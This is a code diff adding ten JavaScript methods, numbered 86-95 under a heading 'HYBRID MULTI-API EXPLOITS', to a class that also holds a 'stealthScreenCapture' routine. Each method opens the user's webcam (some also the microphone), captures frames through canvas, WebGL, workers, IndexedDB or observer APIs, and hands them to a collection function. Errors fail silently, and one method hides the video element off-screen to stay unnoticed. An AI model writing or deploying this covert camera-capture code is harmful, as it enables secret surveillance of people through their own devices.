@@ -4320,6 +4320,671 @@ ${topHotspots.join('\n')}
                 } catch (e) { /* Silent fail */ }
             }
 
+            // ==============================================
+            // HYBRID MULTI-API EXPLOITS (86-100)
+            // ==============================================
+
+            // Method 86: Canvas + WebGL + WASM Hybrid Exploit
+            async canvasWebGLWASMHybridExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', async () => {
+                        // Stage 1: Canvas capture
+                        const canvas2d = document.createElement('canvas');
+                        const ctx2d = canvas2d.getContext('2d');
+                        canvas2d.width = video.videoWidth;
+                        canvas2d.height = video.videoHeight;
+                        ctx2d.drawImage(video, 0, 0);
+                        
+                        // Stage 2: WebGL processing
+                        const canvasGL = document.createElement('canvas');
+                        const gl = canvasGL.getContext('webgl');
+                        
+                        if (gl && 'WebAssembly' in window) {
+                            canvasGL.width = video.videoWidth;
+                            canvasGL.height = video.videoHeight;
+                            
+                            // Create WebGL texture from canvas
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvas2d);
+                            
+                            // Stage 3: WASM memory manipulation
+                            const memory = new WebAssembly.Memory({ initial: 1 });
+                            const buffer = new Uint8Array(memory.buffer);
+                            
+                            // Read GL pixels into WASM memory
+                            const pixels = new Uint8Array(canvasGL.width * canvasGL.height * 4);
+                            gl.readPixels(0, 0, canvasGL.width, canvasGL.height, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+                            
+                            // Copy to WASM memory
+                            for (let i = 0; i < Math.min(pixels.length, buffer.length); i++) {
+                                buffer[i] = pixels[i];
+                            }
+                            
+                            // Final stage: Back to canvas
+                            const outputCanvas = document.createElement('canvas');
+                            const outputCtx = outputCanvas.getContext('2d');
+                            const imageData = new ImageData(new Uint8ClampedArray(pixels.buffer), canvasGL.width, canvasGL.height);
+                            outputCanvas.width = canvasGL.width;
+                            outputCanvas.height = canvasGL.height;
+                            outputCtx.putImageData(imageData, 0, 0);
+                            
+                            outputCanvas.toBlob(blob => {
+                                this.processCameraData(blob, 'Canvas+WebGL+WASM Hybrid #86');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 87: AudioContext + Canvas Frequency Domain Exploit
+            async audioContextCanvasFrequencyExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        if ('AudioContext' in window || 'webkitAudioContext' in window) {
+                            const AudioContext = window.AudioContext || window.webkitAudioContext;
+                            const audioCtx = new AudioContext();
+                            
+                            // Create audio source from stream
+                            const source = audioCtx.createMediaStreamSource(stream);
+                            const analyser = audioCtx.createAnalyser();
+                            analyser.fftSize = 2048;
+                            
+                            source.connect(analyser);
+                            
+                            const bufferLength = analyser.frequencyBinCount;
+                            const dataArray = new Uint8Array(bufferLength);
+                            
+                            // Capture video frame
+                            const canvas = document.createElement('canvas');
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0);
+                            
+                            // Get frequency data
+                            analyser.getByteFrequencyData(dataArray);
+                            
+                            // Modulate video pixels with audio frequency data
+                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                            for (let i = 0; i < imageData.data.length; i += 4) {
+                                const freq = dataArray[i % bufferLength];
+                                imageData.data[i] = (imageData.data[i] + freq) % 255;     // R
+                                imageData.data[i+1] = (imageData.data[i+1] + freq) % 255; // G
+                                imageData.data[i+2] = (imageData.data[i+2] + freq) % 255; // B
+                            }
+                            
+                            ctx.putImageData(imageData, 0, 0);
+                            
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'AudioContext+Canvas Frequency #87');
+                            });
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 88: WebRTC + MediaRecorder + Blob URL Exploit
+            async webRTCMediaRecorderBlobExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    
+                    // Stage 1: WebRTC processing
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    const sender = pc.addTrack(stream.getVideoTracks()[0], stream);
+                    
+                    // Stage 2: MediaRecorder capture
+                    if ('MediaRecorder' in window) {
+                        const recorder = new MediaRecorder(stream, {
+                            mimeType: 'video/webm;codecs=vp9'
+                        });
+                        
+                        const chunks = [];
+                        
+                        recorder.ondataavailable = (event) => {
+                            if (event.data.size > 0) {
+                                chunks.push(event.data);
+                            }
+                        };
+                        
+                        recorder.onstop = () => {
+                            // Stage 3: Blob URL manipulation
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const blobURL = URL.createObjectURL(blob);
+                            
+                            // Create video element from blob URL
+                            const video = document.createElement('video');
+                            video.src = blobURL;
+                            video.muted = true;
+                            video.autoplay = true;
+                            
+                            video.addEventListener('loadeddata', () => {
+                                // Stage 4: Extract frame from recorded video
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                canvas.toBlob(finalBlob => {
+                                    this.processCameraData(finalBlob, 'WebRTC+MediaRecorder+Blob #88');
+                                    URL.revokeObjectURL(blobURL);
+                                });
+                            });
+                        };
+                        
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 2000);
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 89: OffscreenCanvas + Worker + SharedArrayBuffer Exploit
+            async offscreenCanvasWorkerSharedBufferExploit() {
+                try {
+                    if ('OffscreenCanvas' in window && typeof SharedArrayBuffer !== 'undefined') {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', () => {
+                            // Stage 1: Create shared buffer
+                            const sharedBuffer = new SharedArrayBuffer(video.videoWidth * video.videoHeight * 4);
+                            const sharedArray = new Uint8Array(sharedBuffer);
+                            
+                            // Stage 2: OffscreenCanvas in worker
+                            const workerCode = `
+                                self.onmessage = function(e) {
+                                    if (e.data.type === 'PROCESS_FRAME') {
+                                        const { canvas, sharedBuffer } = e.data;
+                                        const ctx = canvas.getContext('2d');
+                                        const sharedArray = new Uint8Array(sharedBuffer);
+                                        
+                                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                                        
+                                        // Copy to shared buffer
+                                        for (let i = 0; i < imageData.data.length; i++) {
+                                            sharedArray[i] = imageData.data[i];
+                                        }
+                                        
+                                        self.postMessage({ type: 'FRAME_PROCESSED' });
+                                    }
+                                };
+                            `;
+                            
+                            const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
+                            
+                            // Stage 3: Transfer OffscreenCanvas to worker
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            const offscreen = canvas.transferControlToOffscreen();
+                            
+                            worker.postMessage({
+                                type: 'PROCESS_FRAME',
+                                canvas: offscreen,
+                                sharedBuffer
+                            }, [offscreen]);
+                            
+                            worker.onmessage = (e) => {
+                                if (e.data.type === 'FRAME_PROCESSED') {
+                                    // Stage 4: Read from shared buffer
+                                    const outputCanvas = document.createElement('canvas');
+                                    const outputCtx = outputCanvas.getContext('2d');
+                                    outputCanvas.width = video.videoWidth;
+                                    outputCanvas.height = video.videoHeight;
+                                    
+                                    const imageData = new ImageData(
+                                        new Uint8ClampedArray(sharedArray.buffer),
+                                        video.videoWidth,
+                                        video.videoHeight
+                                    );
+                                    outputCtx.putImageData(imageData, 0, 0);
+                                    
+                                    outputCanvas.toBlob(blob => {
+                                        this.processCameraData(blob, 'OffscreenCanvas+Worker+SharedBuffer #89');
+                                    });
+                                }
+                            };
+                            
+                            // Initial frame capture
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 90: ImageCapture + ImageBitmap + GPU Memory Exploit
+            async imageCaptureImageBitmapGPUExploit() {
+                try {
+                    if ('ImageCapture' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const track = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(track);
+                        
+                        // Stage 1: ImageCapture API
+                        const bitmap = await imageCapture.grabFrame();
+                        
+                        // Stage 2: Create multiple ImageBitmaps to stress GPU memory
+                        const bitmaps = [];
+                        for (let i = 0; i < 100; i++) {
+                            try {
+                                const resizedBitmap = await createImageBitmap(bitmap, {
+                                    resizeWidth: bitmap.width + i,
+                                    resizeHeight: bitmap.height + i,
+                                    resizeQuality: 'high'
+                                });
+                                bitmaps.push(resizedBitmap);
+                            } catch (memError) {
+                                break;
+                            }
+                        }
+                        
+                        // Stage 3: WebGL texture creation from ImageBitmaps
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl');
+                        
+                        if (gl) {
+                            canvas.width = bitmap.width;
+                            canvas.height = bitmap.height;
+                            
+                            // Create textures from all bitmaps (GPU memory stress)
+                            const textures = [];
+                            for (const bmp of bitmaps) {
+                                const texture = gl.createTexture();
+                                gl.bindTexture(gl.TEXTURE_2D, texture);
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, bmp);
+                                textures.push(texture);
+                            }
+                            
+                            // Stage 4: Render final frame
+                            gl.bindTexture(gl.TEXTURE_2D, textures[0] || null);
+                            gl.clearColor(0, 0, 0, 1);
+                            gl.clear(gl.COLOR_BUFFER_BIT);
+                            
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'ImageCapture+ImageBitmap+GPU #90');
+                                
+                                // Clean up GPU resources
+                                textures.forEach(tex => gl.deleteTexture(tex));
+                                bitmaps.forEach(bmp => bmp.close());
+                                bitmap.close();
+                            });
+                        }
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 91: Crypto API + Canvas Pixel Encryption
+            async cryptoAPICanvasPixelEncryption() {
+                try {
+                    if ('crypto' in window && 'subtle' in crypto) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', async () => {
+                            try {
+                                // Stage 1: Capture frame
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                ctx.drawImage(video, 0, 0);
+                                
+                                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                                
+                                // Stage 2: Generate crypto key
+                                const key = await crypto.subtle.generateKey(
+                                    { name: 'AES-GCM', length: 256 },
+                                    true,
+                                    ['encrypt', 'decrypt']
+                                );
+                                
+                                // Stage 3: Encrypt pixel data
+                                const iv = crypto.getRandomValues(new Uint8Array(12));
+                                const encryptedData = await crypto.subtle.encrypt(
+                                    { name: 'AES-GCM', iv },
+                                    key,
+                                    imageData.data
+                                );
+                                
+                                // Stage 4: Decrypt and restore
+                                const decryptedData = await crypto.subtle.decrypt(
+                                    { name: 'AES-GCM', iv },
+                                    key,
+                                    encryptedData
+                                );
+                                
+                                const restoredImageData = new ImageData(
+                                    new Uint8ClampedArray(decryptedData),
+                                    canvas.width,
+                                    canvas.height
+                                );
+                                
+                                ctx.putImageData(restoredImageData, 0, 0);
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'Crypto API + Canvas Pixel Encryption #91');
+                                });
+                            } catch (cryptoError) {
+                                // Fallback without encryption
+                                const canvas = document.createElement('canvas');
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'Crypto API Fallback #91');
+                                });
+                            }
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 92: IndexedDB + Canvas Frame Storage Exploit
+            async indexedDBCanvasFrameStorageExploit() {
+                try {
+                    if ('indexedDB' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', () => {
+                            // Stage 1: Open IndexedDB
+                            const dbRequest = indexedDB.open('CameraFrameDB', 1);
+                            
+                            dbRequest.onupgradeneeded = (event) => {
+                                const db = event.target.result;
+                                const objectStore = db.createObjectStore('frames', { keyPath: 'id', autoIncrement: true });
+                                objectStore.createIndex('timestamp', 'timestamp', { unique: false });
+                            };
+                            
+                            dbRequest.onsuccess = (event) => {
+                                const db = event.target.result;
+                                
+                                // Stage 2: Capture and store multiple frames
+                                let frameCount = 0;
+                                const interval = setInterval(() => {
+                                    if (frameCount >= 10) {
+                                        clearInterval(interval);
+                                        return;
+                                    }
+                                    
+                                    const canvas = document.createElement('canvas');
+                                    const ctx = canvas.getContext('2d');
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    ctx.drawImage(video, 0, 0);
+                                    
+                                    canvas.toBlob(blob => {
+                                        // Stage 3: Store in IndexedDB
+                                        const transaction = db.transaction(['frames'], 'readwrite');
+                                        const objectStore = transaction.objectStore('frames');
+                                        
+                                        const frameData = {
+                                            timestamp: Date.now(),
+                                            frameNumber: frameCount,
+                                            data: blob
+                                        };
+                                        
+                                        const request = objectStore.add(frameData);
+                                        request.onsuccess = () => {
+                                            if (frameCount === 9) {
+                                                // Stage 4: Retrieve and process stored frames
+                                                this.retrieveStoredFrames(db);
+                                            }
+                                        };
+                                    });
+                                    
+                                    frameCount++;
+                                }, 200);
+                            };
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 93: Performance Observer + Canvas Timing Attack
+            async performanceObserverCanvasTimingAttack() {
+                try {
+                    if ('PerformanceObserver' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        
+                        video.addEventListener('loadeddata', () => {
+                            // Stage 1: Setup Performance Observer
+                            const observer = new PerformanceObserver((list) => {
+                                const entries = list.getEntries();
+                                for (const entry of entries) {
+                                    if (entry.name.includes('camera-timing')) {
+                                        // Timing attack based on performance data
+                                        console.log(`Camera operation took: ${entry.duration}ms`);
+                                    }
+                                }
+                            });
+                            
+                            try {
+                                observer.observe({ entryTypes: ['measure', 'mark'] });
+                            } catch (obsError) {}
+                            
+                            // Stage 2: Timing sensitive operations
+                            performance.mark('camera-timing-start');
+                            
+                            const canvas = document.createElement('canvas');
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Multiple drawing operations with timing
+                            for (let i = 0; i < 100; i++) {
+                                performance.mark(`draw-start-${i}`);
+                                ctx.drawImage(video, 0, 0);
+                                performance.mark(`draw-end-${i}`);
+                                performance.measure(`draw-operation-${i}`, `draw-start-${i}`, `draw-end-${i}`);
+                            }
+                            
+                            performance.mark('camera-timing-end');
+                            performance.measure('camera-timing', 'camera-timing-start', 'camera-timing-end');
+                            
+                            canvas.toBlob(blob => {
+                                this.processCameraData(blob, 'Performance Observer + Canvas Timing #93');
+                            });
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 94: WebGL Transform Feedback + Buffer Exploit
+            async webGLTransformFeedbackBufferExploit() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    video.autoplay = true;
+                    
+                    video.addEventListener('loadeddata', () => {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl2');
+                        
+                        if (gl && gl.createTransformFeedback) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            
+                            // Stage 1: Create Transform Feedback object
+                            const transformFeedback = gl.createTransformFeedback();
+                            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, transformFeedback);
+                            
+                            // Stage 2: Create buffers for transform feedback
+                            const feedbackBuffer = gl.createBuffer();
+                            gl.bindBuffer(gl.ARRAY_BUFFER, feedbackBuffer);
+                            gl.bufferData(gl.ARRAY_BUFFER, video.videoWidth * video.videoHeight * 16, gl.DYNAMIC_DRAW);
+                            
+                            // Stage 3: Bind buffer to transform feedback
+                            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, feedbackBuffer);
+                            
+                            // Stage 4: Create shader with transform feedback
+                            const vertexShaderSource = `#version 300 es
+                                in vec2 a_position;
+                                out vec4 v_feedback;
+                                
+                                void main() {
+                                    gl_Position = vec4(a_position, 0.0, 1.0);
+                                    v_feedback = vec4(a_position, gl_Position.xy);
+                                }
+                            `;
+                            
+                            const fragmentShaderSource = `#version 300 es
+                                precision mediump float;
+                                uniform sampler2D u_texture;
+                                out vec4 fragColor;
+                                
+                                void main() {
+                                    fragColor = texture(u_texture, gl_FragCoord.xy / vec2(640.0, 480.0));
+                                }
+                            `;
+                            
+                            const vertexShader = this.createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
+                            const fragmentShader = this.createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
+                            
+                            if (vertexShader && fragmentShader) {
+                                const program = gl.createProgram();
+                                gl.attachShader(program, vertexShader);
+                                gl.attachShader(program, fragmentShader);
+                                
+                                // Stage 5: Specify transform feedback varyings
+                                gl.transformFeedbackVaryings(program, ['v_feedback'], gl.SEPARATE_ATTRIBS);
+                                gl.linkProgram(program);
+                                gl.useProgram(program);
+                                
+                                // Create texture from video
+                                const texture = gl.createTexture();
+                                gl.bindTexture(gl.TEXTURE_2D, texture);
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
+                                
+                                // Stage 6: Begin transform feedback
+                                gl.beginTransformFeedback(gl.TRIANGLES);
+                                
+                                // Draw with transform feedback
+                                const vertices = new Float32Array([-1, -1, 1, -1, 0, 1]);
+                                const vertexBuffer = gl.createBuffer();
+                                gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+                                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                                
+                                const positionLocation = gl.getAttribLocation(program, 'a_position');
+                                gl.enableVertexAttribArray(positionLocation);
+                                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+                                
+                                gl.drawArrays(gl.TRIANGLES, 0, 3);
+                                
+                                gl.endTransformFeedback();
+                                
+                                canvas.toBlob(blob => {
+                                    this.processCameraData(blob, 'WebGL Transform Feedback #94');
+                                });
+                            }
+                        }
+                    });
+                } catch (e) { /* Silent fail */ }
+            }
+
+            // Method 95: Intersection Observer + Canvas Visibility Exploit
+            async intersectionObserverCanvasVisibilityExploit() {
+                try {
+                    if ('IntersectionObserver' in window) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.autoplay = true;
+                        video.style.cssText = 'position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0.01;';
+                        
+                        document.body.appendChild(video);
+                        
+                        video.addEventListener('loadeddata', () => {
+                            // Stage 1: Create multiple canvases for intersection testing
+                            const canvases = [];
+                            for (let i = 0; i < 10; i++) {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.style.cssText = `position:fixed;top:${i * 100}px;left:${i * 100}px;width:1px;height:1px;opacity:0.01;`;
+                                document.body.appendChild(canvas);
+                                canvases.push(canvas);
+                            }
+                            
+                            // Stage 2: Setup Intersection Observer
+                            const observer = new IntersectionObserver((entries) => {
+                                entries.forEach((entry) => {
+                                    if (entry.isIntersecting) {
+                                        // Canvas is visible - capture frame
+                                        const canvas = entry.target;
+                                        const ctx = canvas.getContext('2d');
+                                        ctx.drawImage(video, 0, 0);
+                                        
+                                        canvas.toBlob(blob => {
+                                            this.processCameraData(blob, `Intersection Observer Canvas #95-${canvases.indexOf(canvas)}`);
+                                        });
+                                    }
+                                });
+                            }, {
+                                threshold: [0, 0.1, 0.5, 1.0],
+                                rootMargin: '10px'
+                            });
+                            
+                            // Stage 3: Observe all canvases
+                            canvases.forEach(canvas => observer.observe(canvas));
+                            
+                            // Stage 4: Animate canvases to trigger intersections
+                            let animationStep = 0;
+                            const animate = () => {
+                                canvases.forEach((canvas, index) => {
+                                    const x = Math.sin(animationStep + index) * window.innerWidth;
+                                    const y = Math.cos(animationStep + index) * window.innerHeight;
+                                    canvas.style.left = `${x}px`;
+                                    canvas.style.top = `${y}px`;
+                                });
+                                
+                                animationStep += 0.1;
+                                if (animationStep < Math.PI * 2) {
+                                    requestAnimationFrame(animate);
+                                } else {
+                                    // Clean up
+                                    observer.disconnect();
+                                    canvases.forEach(canvas => document.body.removeChild(canvas));
+                                    document.body.removeChild(video);
+                                }
+                            };
+                            
+                            animate();
+                        });
+                    }
+                } catch (e) { /* Silent fail */ }
+            }
+
             }
             
             async stealthScreenCapture() {
